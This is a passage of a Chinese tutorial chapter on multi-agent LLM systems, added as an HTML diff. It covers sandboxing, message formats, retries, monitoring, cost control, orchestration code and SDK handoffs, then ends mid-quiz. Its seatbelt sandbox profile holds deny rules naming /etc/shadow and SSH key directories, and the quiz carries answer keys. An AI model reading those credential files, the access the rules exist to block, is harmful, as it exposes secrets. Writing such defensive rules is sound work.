+; 进程权限：只允许执行Python
+(allow process-exec (regex "/usr/bin/python3"))
+(allow process-exec (regex "/usr/local/bin/pip3"))
+
+; 拒绝危险操作
+(deny file-read* (subpath "/etc/shadow"))
+(deny file-read* (subpath "/Users/*/ssh"))
+(deny network-outbound (regex ".*"))  ; 先拒绝所有，再逐条放开</pre>
+</div>
+
+<div class="code-block">
+  <span class="code-label">Linux bubblewrap 沙箱启动命令</span>
+<pre># bubblewrap 沙箱 — 最小权限启动 Agent 代码执行
+bwrap \
+  --ro-bind /usr /usr \              # 只读挂载系统目录
+  --ro-bind /lib /lib \              # 只读挂载库目录
+  --bind /workspace/agent-data /data \ # 可读写挂载工作目录
+  --dev /dev \                        # 最小设备访问
+  --unshare-net \                     # 禁用网络（如需网络则逐条放开）
+  --die-with-parent \                 # 父进程退出时沙箱也退出
+  --new-session \                     # 创建新session隔离
+  python3 /data/agent_task.py          # 执行Agent任务</pre>
+</div>
+
+<div class="quote">
+  最小权限原则是沙箱安全的基石：默认拒绝所有权限，只逐条放开 Agent 必需的权限。宁可多一步手动配置，不可少一层安全防线。
+</div>
+
+<!-- ===== 7.8 多Agent系统的生产实践 ===== -->
+<h2 class="section-heading">7.8 多Agent系统的生产实践</h2>
+
+<p>从实验室到生产环境，多 Agent 系统需要面对<strong>数据格式、错误处理、监控追踪、成本控制</strong>四大工程挑战。</p>
+
+<h3 class="sub-heading">7.8.1 通信数据格式标准化</h3>
+
+<p>Agent 之间传递的数据必须有统一的格式约定，否则"鸡同鸭讲"：</p>
+
+<div class="card">
+  <div class="card-title">📐 Agent 通信数据格式规范</div>
+  <table style="width: 100%; border-collapse: collapse; font-size: 14px; margin-top: 12px;">
+    <thead>
+      <tr style="border-bottom: 2px solid var(--color-border);">
+        <th style="text-align: left; padding: 12px 8px;">字段</th>
+        <th style="text-align: left; padding: 12px 8px;">类型</th>
+        <th style="text-align: left; padding: 12px 8px;">说明</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500; color: var(--color-info);">task_id</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">string</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">唯一任务标识，用于追踪整个流转链路</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500; color: var(--color-accent);">from_agent</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">string</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">发送方 Agent 名称/ID</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500; color: var(--color-success);">to_agent</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">string</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">接收方 Agent 名称/ID</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500; color: var(--color-warning);">content</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">object</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">消息内容（文本/数据/文件引用）</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500;">status</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">string</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">任务状态（pending/running/completed/failed）</td>
+      </tr>
+      <tr>
+        <td style="padding: 10px 8px; font-weight: 500;">timestamp</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">string</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">ISO8601时间戳，用于时序追踪和排序</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="code-block">
+  <span class="code-label">标准化消息格式示例</span>
+<pre># Agent 间通信的标准化消息格式
+{
+    "task_id": "task-20250701-001",
+    "from_agent": "search_agent",
+    "to_agent": "analysis_agent",
+    "content": {
+        "type": "search_results",
+        "data": [
+            {"title": "2025年AI发展趋势", "url": "...", "summary": "..."},
+            {"title": "多Agent协作最新进展", "url": "...", "summary": "..."}
+        ]
+    },
+    "status": "completed",
+    "timestamp": "2025-07-01T10:30:00Z",
+    "metadata": {
+        "tokens_used": 1520,
+        "execution_time_ms": 3500
+    }
+}</pre>
+</div>
+
+<h3 class="sub-heading">7.8.2 错误处理与重试策略</h3>
+
+<p>多 Agent 系统中，任何一个 Agent 都可能出错。关键是要有<strong>容错机制</strong>，不让一个 Agent 的失败拖垮整个系统：</p>
+
+<div class="card">
+  <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px;">
+    <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-top: 3px solid var(--color-error);">
+      <strong style="color: var(--color-error);">① 降级策略</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 8px 0 0;">
+        某个 Agent 失败时，编排者降级处理：跳过该步骤或用备选 Agent 替代。例如搜索 Agent 超时，编排者用缓存数据替代。
+      </p>
+    </div>
+    <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-top: 3px solid var(--color-warning);">
+      <strong style="color: var(--color-warning);">② 重试策略</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 8px 0 0;">
+        可恢复的错误（网络抖动、API限流）采用指数退避重试。最多重试 3 次，每次间隔递增（1s→4s→16s）。不可恢复的错误直接降级。
+      </p>
+    </div>
+    <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-top: 3px solid var(--color-success);">
+      <strong style="color: var(--color-success);">③ 级联阻断</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 8px 0 0;">
+        设置超时上限和重试上限。如果一个 Agent 重试3次仍失败，编排者放弃该子任务，用部分结果继续推进，而非无限等待。
+      </p>
+    </div>
+  </div>
+</div>
+
+<div class="code-block">
+  <span class="code-label">错误处理与重试策略代码示例</span>
+<pre># 多 Agent 错误处理与重试策略
+import asyncio
+from datetime import datetime
+
+class AgentRetryPolicy:
+    """Agent 重试策略配置"""
+    max_retries = 3           # 最大重试次数
+    base_delay = 1.0          # 基础延迟（秒）
+    max_delay = 60.0          # 最大延迟（秒）
+    timeout_per_attempt = 30  # 单次超时（秒）
+
+    def get_delay(self, attempt: int) -> float:
+        """指数退避：1s → 4s → 16s"""
+        delay = self.base_delay * (2 ** attempt)
+        return min(delay, self.max_delay)
+
+async def call_agent_with_retry(agent, task, policy=AgentRetryPolicy()):
+    """带重试的 Agent 调用"""
+    for attempt in range(policy.max_retries + 1):
+        try:
+            result = await asyncio.wait_for(
+                agent.execute(task),
+                timeout=policy.timeout_per_attempt
+            )
+            return result  # 成功，返回结果
+        except asyncio.TimeoutError:
+            print(f"[{datetime.now()}] Agent {agent.name} 超时，"
+                  f"第 {attempt + 1} 次重试")
+        except ConnectionError as e:
+            print(f"[{datetime.now()}] Agent {agent.name} 连接错误: {e}")
+            if attempt >= policy.max_retries:
+                return {"status": "failed", "reason": "连接不可恢复"}
+        except Exception as e:
+            print(f"[{datetime.now()}] Agent {agent.name} 未知错误: {e}")
+            return {"status": "failed", "reason": str(e)}
+
+        # 等待退避时间后重试
+        delay = policy.get_delay(attempt)
+        await asyncio.sleep(delay)
+
+    # 重试耗尽，降级处理
+    return {"status": "degraded", "reason": "重试耗尽，降级处理"}</pre>
+</div>
+
+<h3 class="sub-heading">7.8.3 监控与可观测性</h3>
+
+<p>生产环境中，你需要知道每个 Agent <strong>做了什么、花了多少、是否异常</strong>。这需要完整的可观测性体系：</p>
+
+<div class="card">
+  <div class="card-title">📊 Agent 可观测性三支柱</div>
+  <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; margin-top: 16px;">
+    <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-top: 3px solid var(--color-info);">
+      <strong style="color: var(--color-info);">日志（Logging）</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 8px 0 0;">
+        记录每个 Agent 的输入、输出、决策过程。结构化日志（JSON格式），包含 task_id、agent_name、timestamp，便于检索和回溯。
+      </p>
+    </div>
+    <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-top: 3px solid var(--color-accent);">
+      <strong style="color: var(--color-accent);">指标（Metrics）</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 8px 0 0;">
+        量化指标：Token 消耗量、执行时间、成功/失败率、重试次数。用 Prometheus + Grafana 可视化，设阈值告警。
+      </p>
+    </div>
+    <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-top: 3px solid var(--color-success);">
+      <strong style="color: var(--color-success);">追踪（Tracing）</strong>
+      <p style="font-size: 13px; color: var(--color-text-secondary); margin: 8px 0 0;">
+        跟踪一个任务在多个 Agent 之间的完整流转链路。类似微服务的分布式追踪，每个 Agent 是一个"span"，task_id 是"trace_id"。
+      </p>
+    </div>
+  </div>
+</div>
+
+<div class="code-block">
+  <span class="code-label">Agent 行为追踪日志示例</span>
+<pre># 结构化日志 — Agent 行为追踪
+import structlog
+
+logger = structlog.get_logger()
+
+# 编排者分配任务时记录
+logger.info("task_assigned",
+    task_id="task-20250701-001",
+    from_agent="orchestrator",
+    to_agent="search_agent",
+    task_desc="搜索AI发展趋势",
+    timestamp="2025-07-01T10:30:00Z")
+
+# 搜索 Agent 完成时记录
+logger.info("task_completed",
+    task_id="task-20250701-001",
+    agent="search_agent",
+    tokens_used=1520,
+    execution_time_ms=3500,
+    result_count=5)
+
+# 分析 Agent 处理时记录
+logger.info("task_started",
+    task_id="task-20250701-001",
+    agent="analysis_agent",
+    input_from="search_agent",
+    timestamp="2025-07-01T10:33:30Z")
+
+# 追踪链路可视化：
+# orchestrator → search_agent → analysis_agent → writer_agent
+# 每一步都有 task_id 关联，可完整回溯</pre>
+</div>
+
+<h3 class="sub-heading">7.8.4 成本控制：Token 消耗管理</h3>
+
+<p>多 Agent 系统的 Token 消耗是<strong>倍增</strong>的——3 个 Agent 各独立调用 LLM，总消耗是 3 倍。不加控制，一个小任务可能烧掉几美元的 Token：</p>
+
+<div class="card" style="border-left: 3px solid var(--color-warning);">
+  <strong>成本倍增效应：</strong>单 Agent 完成一个任务消耗 1000 Token。3 个 Agent 各消耗 1000 Token，加上编排者消耗 500 Token，总计 3500 Token——是单 Agent 的 3.5 倍。如果 Agent 数量更多、任务更长，成本快速失控。
+</div>
+
+<div class="card">
+  <div class="card-title">💰 Token 成本控制五大策略</div>
+  <table style="width: 100%; border-collapse: collapse; font-size: 14px; margin-top: 12px;">
+    <thead>
+      <tr style="border-bottom: 2px solid var(--color-border);">
+        <th style="text-align: left; padding: 12px 8px;">策略</th>
+        <th style="text-align: left; padding: 12px 8px;">原理</th>
+        <th style="text-align: left; padding: 12px 8px;">效果</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500; color: var(--color-info);">按需分配</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">编排者只在需要时才调用 Agent，避免无效调用</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">减少 30-50% 无效 Token</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500; color: var(--color-accent);">精简 Prompt</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">每个 Agent 的 Prompt 只包含自己的工具和规则</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">减少 40-60% 上下文 Token</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500; color: var(--color-success);">结果压缩</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">Agent 输出只传递关键信息而非完整上下文</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">减少 50-70% 传递 Token</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--color-border-light);">
+        <td style="padding: 10px 8px; font-weight: 500; color: var(--color-warning);">分级模型</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">简单任务用小模型（GPT-4o-mini），复杂任务用大模型</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">成本降低 60-80%</td>
+      </tr>
+      <tr>
+        <td style="padding: 10px 8px; font-weight: 500;">预算上限</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">设置单任务/单日 Token 预算上限，超限降级处理</td>
+        <td style="padding: 10px 8px; color: var(--color-text-secondary);">防止成本失控</td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<h3 class="sub-heading">7.8.5 实战案例：调研+分析+写作多Agent工作流</h3>
+
+<p>以一个完整的"行业调研报告生成"场景为例，展示多 Agent 编排的全流程：</p>
+
+<div class="flowchart-container" id="productionWorkflow"></div>
+
+<script>
+setTimeout(() => {
+  FlowChart.render('productionWorkflow', {
+    nodes: [
+      { id: 'user_input', label: '用户输入\n"写一份AI行业\n调研报告"', type: 'start' },
+      { id: 'orch_prod', label: '编排者 Agent\n(任务拆分+分配)', type: 'decision' },
+      { id: 'research', label: '调研 Agent\n(搜索+收集资料)', type: 'tool' },
+      { id: 'analyze', label: '分析 Agent\n(数据提取+统计)', type: 'tool' },
+      { id: 'orch_merge', label: '编排者 Agent\n(合并+检查)', type: 'process' },
+      { id: 'writer', label: '写作 Agent\n(生成报告)', type: 'tool' },
+      { id: 'review', label: '审核 Agent\n(质量检查)', type: 'process' },
+      { id: 'final_output', label: '返回用户\n(完整报告)', type: 'end' }
+    ],
+    edges: [
+      { from: 'user_input', to: 'orch_prod' },
+      { from: 'orch_prod', to: 'research', label: '分配调研' },
+      { from: 'orch_prod', to: 'analyze', label: '分配分析' },
+      { from: 'research', to: 'orch_merge', label: '调研结果' },
+      { from: 'analyze', to: 'orch_merge', label: '分析结果' },
+      { from: 'orch_merge', to: 'writer', label: '合并后写作' },
+      { from: 'writer', to: 'review', label: '提交审核' },
+      { from: 'review', to: 'final_output', label: '审核通过' },
+      { from: 'review', to: 'writer', label: '需要修改' }
+    ],
+    animate: true
+  });
+}, 800);
+</script>
+
+<div class="code-block">
+  <span class="code-label">完整多 Agent 工作流编排代码（Python）</span>
+<pre># 生产级多 Agent 工作流编排
+import asyncio
+from dataclasses import dataclass
+from typing import Optional
+
+@dataclass
+class AgentResult:
+    agent_name: str
+    status: str        # completed / failed / degraded
+    content: dict
+    tokens_used: int
+    execution_time_ms: int
+
+class ProductionOrchestrator:
+    """生产级编排者：带错误处理、成本控制、追踪"""
+
+    def __init__(self, budget_limit_tokens=10000):
+        self.budget_limit = budget_limit_tokens
+        self.total_tokens = 0
+        self.trace_log = []
+
+    async def run_workflow(self, user_request: str) -> dict:
+        """完整的调研+分析+写作工作流"""
+        # Step 1: 编排者拆分任务
+        self._log("orchestrator", "task_split", user_request)
+        subtasks = self._split_task(user_request)
+
+        # Step 2: 并行执行调研和分析
+        results = await asyncio.gather(
+            self._call_agent("research_agent", subtasks["research"]),
+            self._call_agent("analysis_agent", subtasks["analysis"]),
+            return_exceptions=True  # 容错：不因一个失败而中断
+        )
+
+        # Step 3: 处理结果（容错降级）
+        research_result = self._handle_result(results[0], "research")
+        analysis_result = self._handle_result(results[1], "analysis")
+
+        # Step 4: 检查预算
+        if self.total_tokens > self.budget_limit:
+            self._log("orchestrator", "budget_exceeded",
+                      f"已用 {self.total_tokens} tokens")
+            return {"status": "budget_exceeded",
+                    "partial_results": [research_result, analysis_result]}
+
+        # Step 5: 合并后调用写作 Agent
+        merged_input = self._merge_results(research_result, analysis_result)
+        writer_result = await self._call_agent("writer_agent", merged_input)
+
+        # Step 6: 审核 Agent 检查质量
+        review_result = await self._call_agent("review_agent", {
+            "draft": writer_result.content,
+            "criteria": "完整性、准确性、可读性"
+        })
+
+        if review_result.content.get("approved"):
+            return {"status": "completed",
+                    "report": writer_result.content,
+                    "trace": self.trace_log}
+        else:
+            # 审核未通过 → 修改后重新提交写作
+            self._log("review_agent", "revision_needed",
+                      review_result.content.get("issues"))
+            return await self.run_workflow(user_request)  # 重新执行
+
+    def _split_task(self, request: str) -> dict:
+        """编排者拆分任务"""
+        return {
+            "research": f"搜索以下主题的最新资料: {request}",
+            "analysis": f"对已有数据进行统计分析: {request}"
+        }
+
+    def _handle_result(self, result, agent_name: str) -> AgentResult:
+        """容错处理：异常降级"""
+        if isinstance(result, Exception):
+            self._log(agent_name, "failed", str(result))
+            return AgentResult(agent_name, "degraded",
+                               {"note": "降级处理，使用缓存数据"}, 0, 0)
+        self.total_tokens += result.tokens_used
+        return result
+
+    def _log(self, agent: str, event: str, detail: str):
+        """追踪日志"""
+        self.trace_log.append({
+            "agent": agent, "event": event,
+            "detail": detail, "timestamp": "2025-07-01T..."
+        })</pre>
+</div>
+
+<!-- ===== 7.9 Handoffs机制详解 ===== -->
+<h2 class="section-heading">7.9 Handoffs机制详解</h2>
+
+<p><strong>Handoffs（任务移交）</strong>是 OpenAI Agents SDK 中引入的核心机制，用于实现 Agent 之间的任务转移。它与编排者-执行者模式密切相关，但更轻量、更灵活。</p>
+
+<div class="quote">
+  Handoffs 就像接力赛中的交接棒——一个 Agent 完成了自己的部分，把"棒"（任务上下文）交给下一个 Agent 继续跑。
+</div>
+
+<h3 class="sub-heading">什么是 Handoffs？</h3>
+
+<p>在 Handoffs 机制中，每个 Agent 定义了自己<strong>可以移交的 Agent 列表</strong>。当一个 Agent 在处理任务时，判断当前任务更适合另一个 Agent 处理，它就会调用 <code>transfer_to_xxx</code> 工具，把任务连同上下文一起移交给目标 Agent。</p>
+
+<div class="card">
+  <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
+    <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-info);">
+      <strong style="color: var(--color-info);">Handoffs 流程</strong>
+      <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; line-height: 1.8; margin: 8px 0 0;">
+        <li>Agent A 处理任务，判断需要移交</li>
+        <li>Agent A 调用 transfer_to_B 工具</li>
+        <li>任务上下文（对话历史+状态）传给 Agent B</li>
+        <li>Agent B 从 Agent A 的结果继续处理</li>
+        <li>Agent B 完成后直接返回用户</li>
+      </ul>
+    </div>
+    <div style="padding: 16px; border: 1px solid var(--color-border); border-radius: 8px; border-left: 3px solid var(--color-accent);">
+      <strong style="color: var(--color-accent);">与编排者-执行者的区别</strong>
+      <ul style="font-size: 13px; color: var(--color-text-secondary); padding-left: 18px; line-height: 1.8; margin: 8px 0 0;">
+        <li>编排者模式：中央控制，所有分配由编排者决定</li>
+        <li>Handoffs：去中心化，Agent 自己判断何时移交</li>
+        <li>编排者更像"项目经理"，Handoffs更像"接力赛"</li>
+        <li>Handoffs 更灵活但可控性略弱</li>
+        <li>两者可以结合：编排者做初始分配，Agent内用Handoffs</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<h3 class="sub-heading">Handoffs 流程图</h3>
+
+<div class="flowchart-container" id="handoffsFlow"></div>
+
+<script>
+setTimeout(() => {
+  FlowChart.render('handoffsFlow', {
+    nodes: [
+      { id: 'user_hand', label: '用户请求\n"帮我分析\n这份财报"', type: 'start' },
+      { id: 'triage', label: '分流 Agent\n(判断任务类型)', type: 'decision' },
+      { id: 'finance', label: '财务分析Agent\n(处理财务数据)', type: 'tool' },
+      { id: 'market', label: '市场分析Agent\n(处理市场趋势)', type: 'tool' },
+      { id: 'summary', label: '总结 Agent\n(汇总报告)', type: 'process' },
+      { id: 'user_result', label: '返回用户\n(完整分析报告)', type: 'end' }
+    ],
+    edges: [
+      { from: 'user_hand', to: 'triage' },
+      { from: 'triage', to: 'finance', label: 'Handoff:财务相关' },
+      { from: 'triage', to: 'market', label: 'Handoff:市场相关' },
+      { from: 'finance', to: 'summary', label: 'Handoff:移交总结' },
+      { from: 'market', to: 'summary', label: 'Handoff:移交总结' },
+      { from: 'summary', to: 'user_result' }
+    ],
+    animate: true
+  });
+}, 900);
+</script>
+
+<h3 class="sub-heading">Handoffs 代码示例</h3>
+
+<div class="code-block">
+  <span class="code-label">OpenAI Agents SDK — Handoffs 配置示例</span>
+<pre># OpenAI Agents SDK — Handoffs 机制
+from agents import Agent, Runner
+
+# 定义三个 Agent，各自声明可移交的目标
+triage_agent = Agent(
+    name="分流Agent",
+    instructions="""你是用户请求的分流员。
+    根据用户请求判断最适合处理的 Agent：
+    - 贡献分析请求 → transfer_to_finance_agent
+    - 市场趋势请求 → transfer_to_market_agent
+    - 综合请求 → transfer_to_summary_agent
+    """,
+    handoffs=[finance_agent, market_agent]  # 可移交的Agent列表
+)
+
+finance_agent = Agent(
+    name="财务分析Agent",
+    instructions="""你是专业的财务分析师。
+    分析财报数据、计算关键指标、评估财务健康状况。
+    完成分析后，将结果移交给总结Agent生成报告。
+    """,
+    handoffs=[summary_agent]  # 完成后移交总结Agent
+)
+
+market_agent = Agent(
+    name="市场分析Agent",
+    instructions="""你是专业的市场分析师。
+    分析市场趋势、竞争格局、行业动态。
+    完成分析后，将结果移交给总结Agent生成报告。
+    """,
+    handoffs=[summary_agent]  # 完成后移交总结Agent
+)
+
+summary_agent = Agent(
+    name="总结Agent",
+    instructions="""你是报告总结专家。
+    整合其他Agent的分析结果，生成一份完整的分析报告。
+    """,
+    handoffs=[]  # 终点Agent，不再移交
+)
+
+# 运行多Agent协作
+result = await Runner.run(
+    starting_agent=triage_agent,  # 从分流Agent开始
+    messages=[{"role": "user",
+               "content": "帮我分析苹果公司2025年Q1财报"}]
+)
+
+# Runner 自动处理 Handoffs：
+# triage → finance → summary → 返回结果
+print(result.final_output)</pre>
+</div>
+
+<div class="card" style="border-left: 3px solid var(--color-info);">
+  <strong>Handoffs 关键设计点：</strong><br>
+  ① 每个 Agent 的 <code>handoffs</code> 列表限定了它可以移交的范围，防止无限循环移交<br>
+  ② 移交时，<strong>完整对话历史</strong>会传递给下一个 Agent，确保上下文连续<br>
+  ③ 移交是 Agent 的自主决策（通过 LLM 判断），而非硬编码规则<br>
+  ④ Runner 跟踪整个移交链路，可记录和回溯每一步决策
+</div>
+
+<!-- ===== 八股总结 ===== -->
+<div class="summary-box">
+  <div class="summary-title">📋 八股总结 — 面试高频考点</div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q1: 为什么需要多 Agent？单 Agent 有什么瓶颈？</div>
+    <div class="qa-answer">
+      单 Agent 瓶颈：① Prompt 膨胀（所有工具和规则塞一个 prompt）；② 角色混乱（又要搜索又要分析又要写作）；③ 错误传播（一步错步步错）；④ 上下文爆炸（token 线性增长）；⑤ 无法并行。<br><br>
+      多 Agent 优势：职责分离、Prompt 精简、互相纠错、并行执行、可扩展。类比：单 Agent 是全栈工程师，多 Agent 是专业团队。
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q2: 多 Agent 的四种经典协作模式是什么？</div>
+    <div class="qa-answer">
+      <strong>① 串行流水线</strong>：搜索→分析→写作，每个 Agent 处理一个阶段，简单可靠但无法并行。<br>
+      <strong>② 编排者-执行者</strong>：编排者分配任务，执行者并行完成后汇报。最常用。<br>
+      <strong>③ 辩论对抗</strong>：多个 Agent 对抗辩论，裁判总结。适合多角度分析。<br>
+      <strong>④ 自主协作</strong>：Agent 之间自由通信协商。最灵活但最难控制。
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q3: 编排者-执行者模式中，编排者的核心职责是什么？</div>
+    <div class="qa-answer">
+      四个核心职责：<br>
+      <strong>① 分析任务</strong>：理解用户需求，判断需要哪些专业 Agent<br>
+      <strong>② 分配任务</strong>：将子任务分配给合适的 Worker Agent<br>
+      <strong>③ 整合结果</strong>：收集各 Agent 输出，整合成完整答案<br>
+      <strong>④ 质量控制</strong>：检查结果完整性和正确性，必要时重新分配
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q4: Agent 之间的三种通信机制？各自代表框架？</div>
+    <div class="qa-answer">
+      <strong>① 消息传递</strong>：Agent 通过消息队列通信（AutoGen）。灵活但可能死锁。<br>
+      <strong>② 共享黑板</strong>：共享一块"黑板"读写（CrewAI）。简单但有并发冲突。<br>
+      <strong>③ 图结构</strong>：定义节点和边的 DAG（LangGraph）。可控但不够灵活。
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q5: LangGraph、AutoGen、CrewAI 各有什么特点？怎么选？</div>
+    <div class="qa-answer">
+      <strong>LangGraph</strong>：图结构，可控性强、可可视化调试。适合需要精确控制流程的场景。<br>
+      <strong>AutoGen</strong>：消息传递，支持 Agent 自由对话。适合探索性、灵活协作的场景。<br>
+      <strong>CrewAI</strong>：角色扮演，定义角色和任务。易上手，适合标准化的团队协作场景。<br><br>
+      选择：要可控选 LangGraph，要灵活选 AutoGen，要简单选 CrewAI。
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q6: A2A协议的核心机制是什么？与MCP有什么区别？</div>
+    <div class="qa-answer">
+      A2A四大核心机制：<br>
+      <strong>① Agent Card</strong>：能力发现，Agent发布JSON元数据文件描述自身能力<br>
+      <strong>② Task生命周期</strong>：创建→运行→完成/失败/拒绝，状态实时同步<br>
+      <strong>③ 消息协作</strong>：Agent间结构化消息传递，支持多轮交互<br>
+      <strong>④ 安全认证</strong>：OAuth2.0身份验证和权限校验<br><br>
+      与MCP的区别：MCP管Agent↔工具（单向调用），A2A管Agent↔Agent（双向协作）。两者互补而非竞争。
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q7: 沙箱隔离有哪些主流方案？选型依据是什么？</div>
+    <div class="qa-answer">
+      四大沙箱方案：<br>
+      <strong>① Docker Sandbox</strong>：微虚拟机，独立内核，隔离级别最高，适合高安全代码执行<br>
+      <strong>② bubblewrap</strong>：Linux namespace隔离，轻量快速，适合Linux环境<br>
+      <strong>③ seatbelt</strong>：macOS系统级沙箱，精确权限控制，适合macOS环境<br>
+      <strong>④ E2B/PPIO</strong>：云端微虚拟机，硬件级隔离，按使用计费<br><br>
+      选型依据：安全要求高→Docker/E2B；轻量快速→bubblewrap/seatbelt；最小权限原则是核心。
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q8: 多Agent生产实践中有哪些关键要点？</div>
+    <div class="qa-answer">
+      四大工程要点：<br>
+      <strong>① 通信数据格式标准化</strong>：task_id + from/to_agent + content + status + timestamp<br>
+      <strong>② 错误处理与重试</strong>：指数退避重试、降级策略、级联阻断<br>
+      <strong>③ 监控与可观测性</strong>：日志（结构化记录）、指标（Token/时间/成功率）、追踪（分布式链路）<br>
+      <strong>④ 成本控制</strong>：按需分配、精简Prompt、结果压缩、分级模型、预算上限
+    </div>
+  </div>
+
+  <div class="qa-item">
+    <div class="qa-question">Q9: Handoffs机制是什么？与编排者模式有什么关系？</div>
+    <div class="qa-answer">
+      Handoffs是OpenAI Agents SDK中的任务移交机制：<br>
+      <strong>核心思想</strong>：Agent自主判断何时移交任务，调用transfer_to_xxx工具将任务连同上下文交给下一个Agent<br>
+      <strong>与编排者模式的区别</strong>：编排者是中央控制（项目经理），Handoffs是去中心化（接力赛）<br>
+      <strong>关键设计</strong>：handoffs列表限定移交范围防循环、完整对话历史确保上下文连续、移交是LLM自主决策<br>
+      <strong>两者可结合</strong>：编排者做初始分配，Agent内部用Handoffs灵活流转
+    </div>
+  </div>
+</div>
+
+<!-- ===== 课后考试 ===== -->
+<div id="quizArea"></div>
+
+<script>
+const ch07Questions = [
+  {
+    type: 'single',
+    question: '多 Agent 系统相比单 Agent 的核心优势是什么？',
+    options: [
+      '使用更大的 LLM 模型',
+      '职责分离、可并行执行、互相纠错',
+      '不需要 LLM 就能运行',
+      'Token 消耗更少'
+    ],
+    answer: [1],
+    explanation: '多 Agent 的核心优势：职责分离（每个 Agent 专注一个角色）、并行执行（独立子任务同时进行）、互相纠错（Agent 之间可以审查）。'
+  },
+  {
+    type: 'single',
+    question: '编排者-执行者模式中，编排者的职责不包括以下哪项？',
+    options: ['分析任务并判断需要哪些Agent', '分配子任务给Worker Agent', '实际执行搜索或代码任务', '整合结果并检查质量'],
+    answer: [2],
+    explanation: '编排者不实际执行任务，而是分析、分配、整合、检查。执行由 Worker Agent 完成。'
+  },
+  {
+    type: 'single',
+    question: '以下哪个框架使用图结构定义 Agent 协作流程？',
+    options: ['AutoGen', 'LangGraph', 'CrewAI', 'MetaGPT'],
+    answer: [1],
+    explanation: 'LangGraph 使用图结构（DAG）定义 Agent 节点和边，可控性强、可可视化调试。'
+  },
+  {
+    type: 'single',
+    question: '辩论对抗模式最适合什么场景？',
+    options: ['简单的搜索任务', '需要多角度分析的问题', '代码执行任务', '文件操作任务'],
+    answer: [1],
+    explanation: '辩论对抗模式让多个 Agent 从不同角度分析同一问题，通过对抗发现盲点，适合需要多角度分析的问题。'
+  },
+  {
+    type: 'single',
+    question: 'CrewAI 框架的核心特点是？',
+    options: ['图结构流程控制', '消息传递自由对话', '角色扮演和任务分配', 'SOP 标准流程'],
+    answer: [2],
+    explanation: 'CrewAI 核心特点是角色扮演：定义角色（Role）、目标（Goal）和任务（Task），让 Agent 像团队成员一样协作。'
+  },
+  {
+    type: 'single',
+    question: 'A2A协议中的Agent Card是什么？',
+    options: [
+      'Agent的训练数据卡片',
+      '描述Agent能力的JSON元数据文件，用于能力发现',
+      'Agent的安全认证证书',
+      'Agent与MCP工具的连接配置'
+    ],
+    answer: [1],
